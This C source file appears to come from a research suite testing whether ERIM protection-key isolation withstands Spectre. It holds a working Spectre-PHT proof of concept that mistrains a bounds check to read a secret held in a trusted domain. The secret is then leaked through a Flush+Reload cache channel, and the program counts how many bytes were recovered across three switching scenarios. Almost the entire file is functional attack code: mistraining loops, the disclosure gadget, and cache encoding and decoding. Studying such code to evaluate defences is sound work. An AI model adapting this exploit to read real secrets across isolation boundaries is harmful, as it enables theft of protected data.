/*
 * spectre_pht_sa_ip
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdarg.h>
#include <common.h>

#include "spex.h"

#include "libcache/cacheutils.h"

#ifndef SCENARIO
  #define SCENARIO 1
#endif


// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "INACCESSIBLE SECRET"

void erim_pkru_failure() {
  fprintf(stderr, "PKRU FAILED");
  exit(144);
}

void set_var(unsigned long * var) {
  *var = 0xAAAAAAAA;
}

unsigned long read_var(unsigned long * var) {
  return *var;
}

void set_var_mon(unsigned long * var) {
  erim_switch_to_trusted;

  {*var = 0xBBBBBBBB;}
  
  erim_switch_to_untrusted;
  
  return;
}

unsigned long read_var_mon(unsigned long * var) {
  unsigned long ret = 0;
  erim_switch_to_trusted;

  do{ret = *var;}while(0);
  
  erim_switch_to_untrusted;
  
  return ret;
}

#if SCENARIO == 3
char access_array(long long x, unsigned char * data, uint64_t f) {
#else
char access_array(long long x, unsigned char * data) {
#endif

  // flushing the data which is used in the condition increases
  // probability of speculation
  size_t len = sizeof(DATA) - 1;
  // HACK: since our secret is now after the public var and x can sometimes be negative
  long long zero = 0;
  mfence();
  flush(&len);
  flush(&zero);

  // ensure data is flushed at this point
  mfence();
  // check that only accessible part (DATA) can be accessed
  if(((float)x / (float)len < 1) && x >= zero) {
    
    // Disclosure Gadget
    char c = ((char*)(data + x))[0];

    // Switch for attack transmit to untrusted
    #if SCENARIO == 2
      Switch_U
    #endif 

    // Transmit
#if SCENARIO == 3
    ((void(*)(char c))f)(c);
#else
    cache_encode(c);
#endif
  }
}

#if SCENARIO == 3
void dummy_func(char c){
  //... do nothing
}

__attribute__((aligned(4096))) void func(char c){
  cache_encode(c);
}
__attribute__((aligned(4096)))  __attribute__((used)) void offset_further_code(){}

#endif

unsigned char * create_secret() {
  // init isolation and sh mem
  if(erim_init(4096, ERIM_FLAG_ISOLATE_TRUSTED)) {
    exit(EXIT_FAILURE);
  }
  // scanmem for wrpkru
  if(erim_memScan(NULL, NULL, ERIM_UNTRUSTED_PKRU)) {
    exit(EXIT_FAILURE);
  }

  // allocate secret
  unsigned char* secret = erim_malloc(sizeof(unsigned char) * 128);

  if(secret == NULL) {
    printf("allocation of secret failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(secret, SECRET, sizeof(SECRET));
  secret[sizeof(SECRET)] = '0';
  erim_switch_to_untrusted;

  return secret;
}

void set_secret(char* secret){
  erim_switch_to_trusted;
  
  memcpy(secret, SECRET, sizeof(SECRET));
  secret[sizeof(SECRET)] = '0';

  erim_switch_to_untrusted;
}

unsigned char * create_public() {
  unsigned char* public = malloc(sizeof(DATA)+1);

  if(public == NULL) {
    printf("allocation of public failed\n");
    exit(EXIT_FAILURE);
  }

  memcpy(public, DATA, sizeof(DATA));
  // ensure data terminates
  public[sizeof(DATA)] = 0;

  return public;
}

int main(int argc, char **argv) {
  fprintf(stderr, "Scenario: %d\n", SCENARIO);
  #if EXEC_PREV == 1
    setupTAndU(0,0, &func, &func);
  #endif

  pagesize = sysconf(_SC_PAGESIZE);
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
  char *_mem = malloc(pagesize * (256 + 4));
  mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
  memset(mem, 0, pagesize * 256);

  unsigned char* data = create_secret();
  unsigned char* public = create_public();
  long long offset = public - data;

  fprintf(stderr, "Public %p, Secret %p, Offset: %llx \n", public, data, offset);
  flush_shared_memory();

  // nothing leaked so far
  char leaked[sizeof(SECRET) + 1];
  memset(leaked, ' ', sizeof(leaked));
  leaked[sizeof(SECRET)] = 0;
  
  int j = 0;
  int c = 0;

  #define MAXITER 50000
  // Switch for the whole attack to untrusted  
  #if SCENARIO == 1
    Switch_U
  #endif

  while (1 && c != MAXITER) {
    c++;
    // for every byte in the string
    j = (j + 1) % sizeof(SECRET);


    // mistrain with valid index    
    // Switch for training to untrusted (1: always untrusted, 2: last transmit was untrusted)
    #if SCENARIO == 3
      Switch_U
    #endif

    for(int y = 0; y < 100; y++) {
      //Enable access if needed below

#if SCENARIO == 3
      access_array(0, public, (uint64_t)dummy_func);
#else
      access_array(0, public);
#endif
    }

    // Switch for speculativer access in victim to trusted
    #if SCENARIO == 2 || SCENARIO == 3
      Switch_T
    #endif 

    // potential out-of-bounds access
    //Enable access -> leak is possible
#if SCENARIO == 3
    access_array(j - offset, public, (uint64_t)func);
#else
    access_array(j - offset, public);
#endif


    // only show inaccessible values (SECRET)
    mfence(); // avoid speculation
    // Recover data from covert channel
    cache_decode_pretty(leaked, j);

    if(!strncmp(leaked, SECRET, sizeof(SECRET) - 1))
      break;

    sched_yield();
    
  }
  //printf("\n\x1b[1A[ ]\n\n[\x1b[32m>\x1b[0m] Done\n");
  

  Switch_T
  int score=0;
  for (int i = 0; i < sizeof(SECRET); i++){

    // Do not include the space!
    if (leaked[i] == data[i] && i != 12){
      score++;
    }
  }

  printf("%d, %d, %d", SCENARIO, c, score);
  if (score > 0){
    printf(" <--\n");
  }else{
    printf("\n");
  }
  return SWS_SUCCESS;
}
